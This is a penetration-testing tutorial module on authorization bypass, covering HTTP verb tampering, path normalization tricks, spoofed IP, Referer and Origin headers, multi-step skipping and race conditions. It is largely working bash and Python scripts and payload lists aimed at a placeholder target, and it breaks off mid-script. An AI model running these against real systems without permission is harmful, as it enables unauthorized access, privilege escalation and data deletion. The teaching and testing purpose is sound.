# 06 — Authorization Bypass

## Overview

**Authorization bypass** encompasses a broad set of techniques that allow an attacker to circumvent access-control mechanisms and perform actions or access data they should not be permitted to reach. While IDOR, horizontal/vertical escalation, and function-level access-control flaws are specific categories, this module covers **cross-cutting bypass techniques** — methods that exploit weaknesses in how authorization is enforced at the transport, routing, and application layers. These map to **OWASP A01:2021 – Broken Access Control**, **CWE-284: Improper Access Control**, and **CWE-863: Incorrect Authorization**.

---

## 1. Authorization Bypass Taxonomy

```
+──────────────────────────────────────────────────────────────+
│          Authorization Bypass Technique Categories           │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  ┌──────────────────────────────────────────────────┐        │
│  │  1. HTTP Verb Tampering                          │        │
│  │     Change HTTP method to bypass restrictions    │        │
│  ├──────────────────────────────────────────────────┤        │
│  │  2. Path Traversal / Normalization Bypasses      │        │
│  │     Manipulate URL path to evade WAF / routing   │        │
│  ├──────────────────────────────────────────────────┤        │
│  │  3. IP-Based Access Control Bypass               │        │
│  │     Spoof IP headers to appear as internal       │        │
│  ├──────────────────────────────────────────────────┤        │
│  │  4. Referer / Origin Header Bypass               │        │
│  │     Forge or remove Referer to bypass checks     │        │
│  ├──────────────────────────────────────────────────┤        │
│  │  5. Multi-Step Process Bypass                    │        │
│  │     Skip authorization-enforced steps            │        │
│  ├──────────────────────────────────────────────────┤        │
│  │  6. Header-Based Bypasses                        │        │
│  │     Manipulate various HTTP headers              │        │
│  ├──────────────────────────────────────────────────┤        │
│  │  7. Race Condition Bypass                        │        │
│  │     Exploit TOCTOU (time-of-check/time-of-use)   │        │
│  ├──────────────────────────────────────────────────┤        │
│  │  8. Encoding / Canonicalization Bypass            │        │
│  │     Use URL encoding, Unicode, etc.              │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

---

## 2. HTTP Verb Tampering

### 2.1 How Verb-Based Authorization Fails

```
+──────────────────────────────────────────────────────────────+
│              HTTP Verb Tampering Attack                       │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Many access-control mechanisms enforce authorization        │
│  only on specific HTTP methods.                              │
│                                                              │
│  Example — security.xml (Java):                              │
│  <security-constraint>                                       │
│    <web-resource-collection>                                 │
│      <url-pattern>/admin/*</url-pattern>                     │
│      <http-method>GET</http-method>                          │
│      <http-method>POST</http-method>                         │
│    </web-resource-collection>                                │
│    <auth-constraint>                                         │
│      <role-name>admin</role-name>                            │
│    </auth-constraint>                                        │
│  </security-constraint>                                      │
│                                                              │
│  Only GET and POST are restricted!                           │
│                                                              │
│  Bypass:                                                     │
│  HEAD   /admin/users → 200 (returns headers, no body)        │
│  PUT    /admin/users → 200 (full access!)                    │
│  DELETE /admin/users/5 → 200 (can delete!)                   │
│  PATCH  /admin/users/5 → 200 (can modify!)                   │
│  OPTIONS /admin/users → 200 (reveals allowed methods)        │
│                                                              │
│  Fix: Use <http-method-omission> or no <http-method>         │
│  element (protects ALL methods by default)                   │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 2.2 Method Override Headers

```http
# Direct method is blocked
DELETE /api/admin/users/5 HTTP/1.1
→ 403 Forbidden

# Try method override headers
POST /api/admin/users/5 HTTP/1.1
X-HTTP-Method-Override: DELETE
→ 200 OK  (bypass!)

# Additional override headers to test
X-HTTP-Method: DELETE
X-Method-Override: DELETE
X-HTTP-Method-Override: DELETE
X-Original-Method: DELETE
X-Original-HTTP-Method: DELETE
_method: DELETE

# URL-based override
POST /api/admin/users/5?_method=DELETE HTTP/1.1
→ 200 OK  (bypass!)

POST /api/admin/users/5?method=DELETE HTTP/1.1
→ 200 OK  (bypass!)
```

### 2.3 Systematic Method Testing

```bash
#!/bin/bash
# Test all HTTP methods against restricted endpoints

TARGET="https://target.com"
SESSION="session=USER_SESSION_TOKEN"
ENDPOINTS=(
    "/admin/dashboard"
    "/admin/users"
    "/admin/config"
    "/api/admin/users"
    "/api/admin/settings"
)
METHODS=(GET POST PUT DELETE PATCH HEAD OPTIONS TRACE)

echo "═══════════════════════════════════════════════════════"
echo "HTTP Method Tampering Test"
echo "═══════════════════════════════════════════════════════"

for endpoint in "${ENDPOINTS[@]}"; do
    echo ""
    echo "Testing: $endpoint"
    echo "───────────────────────────────────────────────────"
    for method in "${METHODS[@]}"; do
        status=$(curl -s -o /dev/null -w "%{http_code}" \
            -X "$method" \
            -H "Cookie: $SESSION" \
            "$TARGET$endpoint")
        
        flag=""
        if [[ "$status" == "200" || "$status" == "201" ]]; then
            flag=" ← POTENTIAL BYPASS!"
        fi
        
        printf "  %-8s → %s%s\n" "$method" "$status" "$flag"
    done
done

# Also test method override headers
echo ""
echo "Testing Method Override Headers..."
echo "───────────────────────────────────────────────────"
OVERRIDES=(
    "X-HTTP-Method-Override: DELETE"
    "X-HTTP-Method: DELETE"
    "X-Method-Override: DELETE"
    "X-Original-Method: DELETE"
)

for header in "${OVERRIDES[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST \
        -H "Cookie: $SESSION" \
        -H "$header" \
        "$TARGET/admin/users/1")
    printf "  POST + %s → %s\n" "$header" "$status"
done
```

### 2.4 Framework Behavior with Methods

| Framework | Undeclared Methods | Override Support |
|---|---|---|
| **Java EE** | ALLOWED (if only specific methods listed) | No built-in |
| **Spring** | 405 Method Not Allowed | `HiddenHttpMethodFilter` |
| **Express.js** | 404 (if no route defined) | `method-override` package |
| **Django** | 405 (if view doesn't handle) | No built-in |
| **Rails** | 404 (routing) | `_method` parameter |
| **Laravel** | 405 | `_method` field in forms |
| **ASP.NET** | Varies | `X-HTTP-Method-Override` |
| **Flask** | 405 (if not in `methods=`) | No built-in |

---

## 3. Path Traversal / Normalization Bypasses

### 3.1 URL Path Manipulation Techniques

```
+──────────────────────────────────────────────────────────────+
│         Path-Based Authorization Bypass Techniques           │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Target: GET /admin/users → 403 Forbidden                    │
│                                                              │
│  Technique 1: Case Variation                                 │
│    /Admin/users                                              │
│    /ADMIN/users                                              │
│    /aDmIn/users                                              │
│                                                              │
│  Technique 2: Path Traversal                                 │
│    /user/../admin/users                                      │
│    /./admin/users                                            │
│    /admin/./users                                            │
│    /../admin/users                                           │
│                                                              │
│  Technique 3: Double Encoding                                │
│    /%61%64%6d%69%6e/users          (admin URL-encoded)       │
│    /%2561%2564%256d%2569%256e/users (double-encoded)         │
│    /admin%2fusers                   (%2f = /)                │
│    /admin%252fusers                 (double-encoded /)       │
│                                                              │
│  Technique 4: Null Byte Injection                            │
│    /admin%00/users                                           │
│    /admin%00.html                                            │
│    /admin/users%00.json                                      │
│                                                              │
│  Technique 5: Extra Characters                               │
│    //admin/users          (double slash)                      │
│    /admin//users                                             │
│    /admin/users/                                             │
│    /admin/users/.                                            │
│    /admin;/users          (semicolon — Tomcat/Jetty)         │
│    /admin..;/users        (Spring path traversal)            │
│    /admin/users?                                             │
│    /admin/users#                                             │
│    /admin/users%23                                           │
│                                                              │
│  Technique 6: Extension Tricks                               │
│    /admin/users.json                                         │
│    /admin/users.html                                         │
│    /admin/users.xml                                          │
│    /admin/users.php                                          │
│    /admin/users.anything                                     │
│                                                              │
│  Technique 7: Unicode / UTF-8 Encoding                       │
│    /admin/users → /ⓐⓓⓜⓘⓝ/users                             │
│    /%c0%ae → '.' in some overlong UTF-8 implementations      │
│    /%ef%bc%8f → fullwidth solidus (/)                        │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 3.2 Framework-Specific Path Bypasses

**Spring Framework (CVE-2022-22965 pattern):**

```http
# Spring path parameter bypass
GET /admin/users;jsessionid=fake HTTP/1.1
# Spring may strip ";jsessionid=fake" before routing
# but WAF sees the full path and allows it

# Spring path traversal
GET /admin/..;/admin/users HTTP/1.1
# ".." with semicolon — some Spring versions handle this differently

# Spring extension handling
GET /admin/users.json HTTP/1.1
# May bypass pattern-matching security constraints
```

**Apache Tomcat:**

```http
# Tomcat path parameter (semicolon)
GET /admin;param=value/users HTTP/1.1
# Tomcat strips ";param=value" → routes to /admin/users
# But WAF/reverse proxy sees /admin;param=value/users

# Tomcat path normalization
GET /admin/..;/api/users HTTP/1.1
```

**Nginx Misconfiguration:**

```nginx
# VULNERABLE: Trailing slash mismatch
location /admin/ {
    # protected
    auth_basic "Admin";
}

# Attack: Request WITHOUT trailing slash
# GET /admin → not matched by location block → bypassed!

# Or with path traversal
# GET /public/../admin/users → Nginx normalizes AFTER routing
```

### 3.3 WAF Bypass via Path Manipulation

```
+──────────────────────────────────────────────────────────────+
│              WAF Path Normalization Bypass                    │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  WAF Rule: Block requests to /admin/*                        │
│                                                              │
│  ┌─────────┐    ┌─────────┐    ┌─────────────┐              │
│  │ Client  │───►│  WAF    │───►│ App Server  │              │
│  │         │    │         │    │             │              │
│  └─────────┘    └─────────┘    └─────────────┘              │
│                                                              │
│  Request: GET /user/../admin/users                           │
│                                                              │
│  WAF sees: /user/../admin/users → doesn't match /admin/*     │
│  App sees: /admin/users (after normalization) → processes!   │
│                                                              │
│  This works when:                                            │
│  • WAF and app normalize paths differently                   │
│  • WAF doesn't normalize at all                              │
│  • Double encoding: WAF decodes once, app decodes twice      │
│                                                              │
│  Key Principle:                                              │
│  Path normalization MUST happen BEFORE authorization check   │
│  at the SAME layer that enforces access control.             │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 3.4 Comprehensive Path Bypass Wordlist

```bash
# Generate path variations for a given endpoint
# Usage: ./path_bypass.sh /admin/users

TARGET_PATH="/admin/users"

# Generate bypass attempts
BYPASSES=(
    "${TARGET_PATH}"
    "${TARGET_PATH}/"
    "${TARGET_PATH}/."
    "${TARGET_PATH}/.."
    "${TARGET_PATH}..;/"
    "/./$(echo $TARGET_PATH | cut -c2-)"
    "/.$(echo $TARGET_PATH)"
    "$(echo $TARGET_PATH | sed 's/\/admin/\/Admin/')"
    "$(echo $TARGET_PATH | sed 's/\/admin/\/ADMIN/')"
    "//$(echo $TARGET_PATH | cut -c2-)"
    "$(echo $TARGET_PATH | sed 's/\/admin/\/%61%64%6d%69%6e/')"
    "${TARGET_PATH}%00"
    "${TARGET_PATH}%00.json"
    "${TARGET_PATH}%23"
    "${TARGET_PATH}?"
    "${TARGET_PATH}.json"
    "${TARGET_PATH}.html"
    "/public/..${TARGET_PATH}"
    "${TARGET_PATH};param=value"
    "$(echo $TARGET_PATH | sed 's/\/admin/\/admin;/')"
    "$(echo $TARGET_PATH | sed 's/\//\/\//g')"
    "${TARGET_PATH}%20"
    "${TARGET_PATH}%09"
)

for bypass in "${BYPASSES[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Cookie: session=USER_TOKEN" \
        "https://target.com${bypass}")
    echo "$STATUS → $bypass"
done
```

---

## 4. IP-Based Access Control Bypass

### 4.1 IP Spoofing via Headers

```
+──────────────────────────────────────────────────────────────+
│           IP-Based Access Control Bypass                     │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Many applications restrict access based on client IP.       │
│  Example: Admin panel only from internal network.            │
│                                                              │
│  Server-side check (VULNERABLE):                             │
│  client_ip = request.headers.get('X-Forwarded-For',          │
│              request.remote_addr)                            │
│  if client_ip in ALLOWED_IPS:                                │
│      allow_access()                                          │
│                                                              │
│  Problem: X-Forwarded-For is CLIENT-CONTROLLED!              │
│                                                              │
│  Attack: Add spoofed IP headers                              │
│                                                              │
│  GET /admin HTTP/1.1                                         │
│  Host: target.com                                            │
│  X-Forwarded-For: 127.0.0.1                                 │
│                                                              │
│  Server reads X-Forwarded-For → thinks request is from       │
│  localhost → grants access!                                  │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 4.2 IP Spoofing Headers to Test

```http
# Test each header with internal/trusted IP values
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 172.16.0.1
X-Forwarded-For: ::1

# Additional IP-related headers
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-ProxyUser-IP: 127.0.0.1
Via: 1.1 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
X-Azure-ClientIP: 127.0.0.1
```

### 4.3 Automated IP Header Testing

```bash
#!/bin/bash
# Test IP-based bypass headers

URL="https://target.com/admin"
SESSION="Cookie: session=USER_TOKEN"

HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-For: 10.0.0.1"
    "X-Forwarded-For: 192.168.1.1"
    "X-Forwarded-For: 172.16.0.1"
    "X-Forwarded-For: ::1"
    "X-Real-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "True-Client-IP: 127.0.0.1"
    "Cluster-Client-IP: 127.0.0.1"
    "Forwarded: for=127.0.0.1"
    "X-ProxyUser-IP: 127.0.0.1"
    "CF-Connecting-IP: 127.0.0.1"
)

echo "Testing IP-based authorization bypass on: $URL"
echo "═══════════════════════════════════════════════════"

# Baseline (no spoofed headers)
BASELINE=$(curl -s -o /dev/null -w "%{http_code}" -H "$SESSION" "$URL")
echo "Baseline (no spoof): $BASELINE"
echo "───────────────────────────────────────────────────"

for header in "${HEADERS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "$SESSION" \
        -H "$header" \
        "$URL")
    
    flag=""
    if [[ "$status" != "$BASELINE" && ("$status" == "200" || "$status" == "301" || "$status" == "302") ]]; then
        flag=" ← BYPASS!"
    fi
    
    printf "%-45s → %s%s\n" "$header" "$status" "$flag"
done
```

### 4.4 IP Header Comparison

| Header | Standard / Spec | Set By | Trust Level |
|---|---|---|---|
| `X-Forwarded-For` | De facto standard | Proxy / Load Balancer | Must validate chain |
| `Forwarded` | RFC 7239 (official) | Proxy | Must validate |
| `X-Real-IP` | Nginx convention | Nginx | Must validate |
| `True-Client-IP` | Akamai/Cloudflare | CDN | Higher if CDN-set |
| `CF-Connecting-IP` | Cloudflare | Cloudflare | High (if Cloudflare) |
| `X-Client-IP` | Non-standard | Various | Low — easily spoofed |
| `X-Originating-IP` | Non-standard | Various | Low — easily spoofed |
| `X-Remote-IP` | Non-standard | Various | Low — easily spoofed |

---

## 5. Referer / Origin Header Bypass

### 5.1 Referer-Based Access Control

```
+──────────────────────────────────────────────────────────────+
│         Referer-Based Authorization Bypass                   │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Some applications check the Referer header to ensure        │
│  requests come from "authorized" pages.                      │
│                                                              │
│  Server check (VULNERABLE):                                  │
│  if 'admin' in request.headers.get('Referer', ''):           │
│      # User navigated from admin page — allow action         │
│      perform_admin_action()                                  │
│  else:                                                       │
│      return 403                                              │
│                                                              │
│  Bypass 1: Set the Referer header                            │
│  Referer: https://target.com/admin/dashboard                 │
│                                                              │
│  Bypass 2: Partial match exploitation                        │
│  Referer: https://evil.com/admin                             │
│  (if server only checks if "admin" is ANYWHERE in Referer)   │
│                                                              │
│  Bypass 3: Remove Referer entirely                           │
│  (some checks allow empty/missing Referer as fallback)       │
│                                                              │
│  Bypass 4: Use meta tag to suppress Referer                  │
│  <meta name="referrer" content="no-referrer">                │
│  <a href="https://target.com/admin/action">Click</a>        │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 5.2 Testing Referer Bypass

```bash
# Test 1: No Referer header
curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=TOKEN" \
    "https://target.com/admin/delete-user?id=5"

# Test 2: Correct Referer
curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=TOKEN" \
    -H "Referer: https://target.com/admin/users" \
    "https://target.com/admin/delete-user?id=5"

# Test 3: Spoofed Referer from external site
curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=TOKEN" \
    -H "Referer: https://evil.com/target.com/admin" \
    "https://target.com/admin/delete-user?id=5"

# Test 4: Partial match (admin in path of different domain)
curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=TOKEN" \
    -H "Referer: https://evil.com/admin" \
    "https://target.com/admin/delete-user?id=5"

# Test 5: Referer with target domain as subdomain
curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=TOKEN" \
    -H "Referer: https://target.com.evil.com/admin" \
    "https://target.com/admin/delete-user?id=5"
```

### 5.3 Origin Header Bypass

```http
# Origin header is used for CORS and CSRF protection

# Test 1: Set Origin to target
Origin: https://target.com

# Test 2: null Origin (can be triggered via sandboxed iframe)
Origin: null

# Test 3: Subdomain of target
Origin: https://evil.target.com

# Test 4: Target as prefix
Origin: https://target.com.evil.com

# Test 5: Target as suffix
Origin: https://eviltarget.com

# Test 6: Remove Origin header entirely
(omit Origin header)
```

---

## 6. Multi-Step Process Bypass

### 6.1 How Multi-Step Authorization Fails

```
+──────────────────────────────────────────────────────────────+
│          Multi-Step Authorization Bypass                      │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Normal admin workflow:                                      │
│                                                              │
│  Step 1: GET /admin/users                                    │
│    ├── Auth check: ✓ Is admin?                               │
│    └── Response: User list                                   │
│                                                              │
│  Step 2: GET /admin/users/5/edit                             │
│    ├── Auth check: ✓ Is admin?                               │
│    └── Response: Edit form for user 5                        │
│                                                              │
│  Step 3: POST /admin/users/5/update                          │
│    ├── Auth check: ✗ NOT CHECKED! (assumes Step 1/2 valid)   │
│    ├── Parameters: { "role": "admin" }                       │
│    └── Action: Updates user 5's role to admin                │
│                                                              │
│  Attack: Skip directly to Step 3!                            │
│                                                              │
│  POST /admin/users/5/update HTTP/1.1                         │
│  Cookie: session=REGULAR_USER_SESSION                        │
│  Content-Type: application/json                              │
│  {"role": "admin"}                                           │
│                                                              │
│  Result: Regular user elevates user 5 to admin!              │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 6.2 Common Multi-Step Vulnerable Patterns

```
+──────────────────────────────────────────────────────────────+
│        Multi-Step Vulnerability Patterns                     │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Pattern 1: Checkout Process                                 │
│  ┌─────────┐    ┌──────────┐    ┌──────────┐                │
│  │ Cart    │───►│ Shipping │───►│ Payment  │                │
│  │ (AuthZ) │    │ (AuthZ)  │    │ (NO AuthZ)│  ← Skip here  │
│  └─────────┘    └──────────┘    └──────────┘                │
│                                                              │
│  Pattern 2: Account Deletion                                 │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐               │
│  │ Confirm  │───►│ Enter    │───►│ Execute  │               │
│  │ Identity │    │ Password │    │ Delete   │               │
│  │ (AuthZ)  │    │ (AuthZ)  │    │ (NO AuthZ)│  ← Skip here │
│  └──────────┘    └──────────┘    └──────────┘               │
│                                                              │
│  Pattern 3: Role Change                                      │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐               │
│  │ List     │───►│ Select   │───►│ Apply    │               │
│  │ Users    │    │ New Role │    │ Change   │               │
│  │ (AuthZ)  │    │ (AuthZ)  │    │ (NO AuthZ)│  ← Skip here │
│  └──────────┘    └──────────┘    └──────────┘               │
│                                                              │
│  Pattern 4: File Operations                                  │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐               │
│  │ Browse   │───►│ Select   │───►│ Download │               │
│  │ Files    │    │ File     │    │          │               │
│  │ (AuthZ)  │    │ (AuthZ)  │    │ (NO AuthZ)│  ← Direct URL│
│  └──────────┘    └──────────┘    └──────────┘               │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 6.3 Testing Multi-Step Bypasses

```python
import requests

BASE = "https://target.com"
USER_SESSION = {"Cookie": "session=REGULAR_USER_TOKEN"}
ADMIN_SESSION = {"Cookie": "session=ADMIN_TOKEN"}

# Step 1: Record the multi-step process as admin
# (Intercept in Burp to capture each step's request)

# Step 2: Try skipping directly to the final action step
# with a regular user's session

# Test: Role change (skip to final step)
print("[*] Testing multi-step bypass: Role Change")
r = requests.post(
    f"{BASE}/admin/users/5/update",
    headers=USER_SESSION,
    json={"role": "admin"}
)
print(f"    Status: {r.status_code}")
print(f"    Response: {r.text[:200]}")

# Test: User deletion (skip to final step)
print("[*] Testing multi-step bypass: User Deletion")
r = requests.post(
    f"{BASE}/admin/users/5/delete",
    headers=USER_SESSION,
    json={"confirmed": True}
)
print(f"    Status: {r.status_code}")

# Test: Configuration change (skip to final step)
print("[*] Testing multi-step bypass: Config Change")
r = requests.put(
    f"{BASE}/admin/config",
    headers=USER_SESSION,
    json={"maintenance_mode": True}
)
print(f"    Status: {r.status_code}")

# Test: Direct file download (skip browsing step)
print("[*] Testing multi-step bypass: Direct Download")
r = requests.get(
    f"{BASE}/admin/export/users.csv",
    headers=USER_SESSION
)
print(f"    Status: {r.status_code}")
print(f"    Content-Type: {r.headers.get('Content-Type', 'N/A')}")
```

---

## 7. Header-Based Authorization Bypasses

### 7.1 Custom Header Exploitation

```
+──────────────────────────────────────────────────────────────+
│         Custom Header-Based Authorization Bypass             │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Some applications use custom headers for access control:    │
│                                                              │
│  Scenario 1: Internal Service Header                         │
│  ┌──────────────────────────────────────────────────┐        │
│  │  Server checks for internal service header:      │        │
│  │  if request.headers.get('X-Internal-Service'):   │        │
│  │      skip_authorization()                        │        │
│  │                                                  │        │
│  │  Bypass: Add the header in your request          │        │
│  │  X-Internal-Service: true                        │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  Scenario 2: Debug Mode Header                               │
│  ┌──────────────────────────────────────────────────┐        │
│  │  if request.headers.get('X-Debug') == 'true':    │        │
│  │      disable_auth_checks()                       │        │
│  │                                                  │        │
│  │  Bypass: X-Debug: true                           │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  Scenario 3: API Version Header                              │
│  ┌──────────────────────────────────────────────────┐        │
│  │  Older API version may lack auth checks:         │        │
│  │  X-API-Version: 1.0    (no auth)                 │        │
│  │  X-API-Version: 2.0    (has auth)                │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 7.2 Headers to Test

```http
# Internal service markers
X-Internal: true
X-Internal-Service: true
X-Internal-Request: true
X-Backend-Service: true
X-Service-Token: internal

# Debug / test mode
X-Debug: true
X-Debug-Mode: 1
X-Test-Mode: true
X-Bypass-Auth: true

# Forwarded / proxy markers
X-Forwarded-Host: admin.internal
X-Host: admin.internal
X-Forwarded-Server: admin.internal

# Content negotiation
Accept: application/json     (API might bypass auth for JSON)
Content-Type: application/xml (different parser, different auth)

# API version switching
X-API-Version: 1.0
Accept-Version: v1
Api-Version: 1
```

---

## 8. Race Condition Authorization Bypass

### 8.1 Time-of-Check-to-Time-of-Use (TOCTOU)

```
+──────────────────────────────────────────────────────────────+
│           TOCTOU Authorization Bypass                        │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Race condition in authorization:                            │
│                                                              │
│  Thread 1 (legit):         Thread 2 (attacker):             │
│  ┌───────────────────┐     ┌───────────────────┐             │
│  │ Check permission  │     │                   │             │
│  │ (user is admin)   │     │                   │             │
│  └────────┬──────────┘     │                   │             │
│           │                │ Revoke admin role  │             │
│           │                │ (demote to user)   │             │
│  ┌────────▼──────────┐     └───────────────────┘             │
│  │ Execute action    │                                       │
│  │ (still runs as    │     Action executes AFTER             │
│  │  admin even       │     role was revoked!                 │
│  │  though revoked!) │                                       │
│  └───────────────────┘                                       │
│                                                              │
│  More common scenario:                                       │
│  • User checks authorization at step 1                       │
│  • Between step 1 and step 2, role/permission changes        │
│  • Step 2 uses cached authorization result                   │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 8.2 Race Condition Exploitation

```python
import asyncio
import aiohttp

async def race_condition_test():
    """Send many concurrent requests to exploit race conditions."""
    url = "https://target.com/api/admin/create-user"
    headers = {"Authorization": "Bearer USER_TOKEN"}
    data = {"username": "newadmin", "role": "admin"}
    
    async with aiohttp.ClientSession() as session:
        # Fire 50 concurrent requests
        tasks = []
        for _ in range(50):
            task = session.post(url, json=data, headers=headers)
            tasks.append(task)
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, resp in enumerate(responses):
            if not isinstance(resp, Exception):
                print(f"Request {i}: Status={resp.status}")
                if resp.status == 200:
                    print(f"  ← POTENTIAL RACE CONDITION BYPASS!")
                await resp.close()

asyncio.run(race_condition_test())
```

```bash
# Using Turbo Intruder (Burp Extension) for race conditions
# Turbo Intruder script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=True)
    
    for i in range(100):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

---

## 9. Comprehensive Authorization Bypass Testing

### 9.1 Master Testing Checklist

```
+──────────────────────────────────────────────────────────────+
│        Authorization Bypass Testing Checklist                │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  HTTP METHOD TESTING                                         │
│  [ ] Test all methods: GET, POST, PUT, DELETE, PATCH,        │
│      HEAD, OPTIONS, TRACE                                    │
│  [ ] Test method override headers (X-HTTP-Method-Override)   │
│  [ ] Test _method query parameter                            │
│                                                              │
│  PATH MANIPULATION                                           │
│  [ ] Case variations (/Admin, /ADMIN, /aDmIn)                │
│  [ ] Path traversal (/user/../admin)                         │
│  [ ] Double encoding (%252f, %2561)                          │
│  [ ] Null byte (%00)                                         │
│  [ ] Semicolon parameter (/admin;param=x/users)              │
│  [ ] Double slashes (//admin//users)                         │
│  [ ] Trailing characters (.json, .html, ?, #)                │
│  [ ] Unicode characters                                      │
│                                                              │
│  IP HEADER SPOOFING                                          │
│  [ ] X-Forwarded-For                                         │
│  [ ] X-Real-IP                                               │
│  [ ] X-Client-IP                                             │
│  [ ] True-Client-IP                                          │
│  [ ] Test with 127.0.0.1, 10.0.0.0/8, ::1                   │
│                                                              │
│  REFERER / ORIGIN BYPASS                                     │
│  [ ] Set Referer to admin page URL                           │
│  [ ] Remove Referer entirely                                 │
│  [ ] Set Origin to null                                      │
│  [ ] Subdomain/prefix Origin tricks                          │
│                                                              │
│  MULTI-STEP PROCESS                                          │
│  [ ] Identify all multi-step workflows                       │
│  [ ] Test each step independently                            │
│  [ ] Skip directly to final action step                      │
│  [ ] Replay steps out of order                               │
│  [ ] Modify parameters between steps                         │
│                                                              │
│  HEADER MANIPULATION                                         │
│  [ ] Test internal service headers                           │
│  [ ] Test debug/test mode headers                            │
│  [ ] Test API version headers                                │
│  [ ] Test custom application headers                         │
│                                                              │
│  RACE CONDITIONS                                             │
│  [ ] Send concurrent requests to restricted endpoints        │
│  [ ] Test TOCTOU in multi-step authorization                 │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 9.2 Automated Bypass Testing Script

```python
import requests
from urllib.parse import quote

class AuthBypassTester:
    def __init__(self, base_url, session_cookie, target_path):
        self.base_url = base_url.rstrip('/')
        self.session = {"Cookie": session_cookie}
        self.target_path = target_path
        self.results = []
    
    def test_request(self, method, path, headers=None, desc=""):
        h = {**self.session, **(headers or {})}
        try:
            r = requests.request(method, f"{self.base_url}{path}",
                               headers=h, allow_redirects=False, timeout=10)
            status = r.status_code
            length = len(r.content)
            result = {
                "desc": desc, "method": method, "path": path,
                "status": status, "length": length,
                "bypass": status in [200, 201, 204, 301, 302]
            }
            self.results.append(result)
            flag = " ← BYPASS!" if result["bypass"] else ""
            print(f"  [{status}] {method:7s} {path[:60]:60s} {desc}{flag}")
            return result
        except Exception as e:
            print(f"  [ERR] {method} {path} - {e}")
    
    def run_all_tests(self):
        p = self.target_path
        print(f"\n{'='*80}")
        print(f"Authorization Bypass Testing: {p}")
        print(f"{'='*80}")
        
        # 1. HTTP Method Tampering
        print("\n[*] HTTP Method Tampering:")
        for m in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']:
            self.test_request(m, p, desc=f"Method: {m}")
        
        # 2. Method Override
        print("\n[*] Method Override Headers:")
        for hdr in ['X-HTTP-Method-Override', 'X-HTTP-Method',
                     'X-Method-Override']:
            self.test_request('POST', p, {hdr: 'GET'}, f"Override: {hdr}")
        self.test_request('POST', f"{p}?_method=GET", desc="URL _method")
        
        # 3. Path Manipulation
        print("\n[*] Path Manipulation:")
        variants = [
            (f"{p}/", "Trailing slash"),
            (f"{p}/.", "Trailing dot"),
            (f"{p}%00", "Null byte"),
            (f"{p}%20", "Trailing space"),
            (f"{p}%23", "URL-encoded #"),
            (f"{p}?", "Trailing ?"),
            (f"{p}.json", "JSON extension"),
            (f"{p}.html", "HTML extension"),
            (f"//{p[1:]}", "Double slash"),
            (f"/.{p}", "Prefix dot-slash"),
            (p.replace('/admin', '/Admin'), "Case: Admin"),
            (p.replace('/admin', '/ADMIN'), "Case: ADMIN"),
            (p.replace('/admin', '/%61%64%6d%69%6e'), "URL-encoded"),
            (f"/public/..{p}", "Path traversal"),
            (p.replace('/admin', '/admin;'), "Semicolon"),
            (p.replace('/admin', '/admin..;'), "Spring bypass"),
        ]
        for path, desc in variants:
            self.test_request('GET', path, desc=desc)
        
        # 4. IP Header Spoofing
        print("\n[*] IP Header Spoofing:")
        ip_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'True-Client-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
        }
